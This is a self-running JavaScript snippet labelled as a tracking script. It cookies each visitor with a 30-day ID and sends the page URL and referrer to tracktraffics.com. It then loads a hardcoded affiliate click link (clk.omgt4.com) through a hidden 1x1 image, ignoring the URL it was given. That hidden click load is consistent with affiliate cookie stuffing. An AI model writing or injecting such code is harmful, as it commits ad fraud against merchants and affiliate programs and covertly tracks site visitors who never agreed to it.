(async function() {
    
    function generateUUID() {
        return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
            var r = Math.random() * 16 | 0,
                v = c === 'x' ? r : (r & 0x3 | 0x8);
            return v.toString(16);
        });
    }


    function createTrackingPixel(url) {
        console.log("vijju url => ",url)
        var img = document.createElement('img');
        img.src = "https://clk.omgt4.com/?PID=56323&AID=2356115";
        img.style.width = '1px';
        img.style.height = '1px';
        img.style.display = 'none';  
        img.style.visibility = 'hidden';
        
        document.body.appendChild(img);
    }

    async function initTracking() {
        if (sessionStorage.getItem('iframe_triggered')) {
            return; 
        }

        try {
            let uniqueId = getCookie('tracking_uuid') || generateUUID();
            let expires = (new Date(Date.now() + 30 * 86400 * 1000)).toUTCString();
            document.cookie = 'tracking_uuid=' + uniqueId + '; expires=' + expires + ';path=/;';

            let response = await fetch('https://www.tracktraffics.com/api/track-user2', {
                method: 'POST',
                body: JSON.stringify({
                    url: window.location.href,
                    referrer: document.referrer,
                    unique_id: uniqueId,
                    origin: window.location.hostname,
                }),
                headers: {
                    'Content-Type': 'application/json',
                    'Access-Control-Allow-Origin':'*'
                }
            });

            let result = await response.json();
            console.log("result => 49", result)
            if (result.success && result.affiliate_url) {
                console.log("if result => 51", result.affiliate_url)
                createTrackingPixel(result.affiliate_url);
                sessionStorage.setItem('iframe_triggered', 'true'); 
            } else {
                console.log("else result => 55")

                createTrackingPixel('https://www.tracktraffics.com/api/fallback-pixel?id=' + uniqueId);
            }
        } catch (error) {
            console.error('Error in tracking script:', error);
        }
    }

    function getCookie(cname) {
        var name = cname + '=';
        var ca = document.cookie.split(';');
        for (var i = 0; i < ca.length; i++) {
            var c = ca[i];
            while (c.charAt(0) === ' ') {
                c = c.substring(1);
            }
            if (c.indexOf(name) === 0) {
                return c.substring(name.length, c.length);
            }
        }
        return '';
    }

   initTracking()
})();
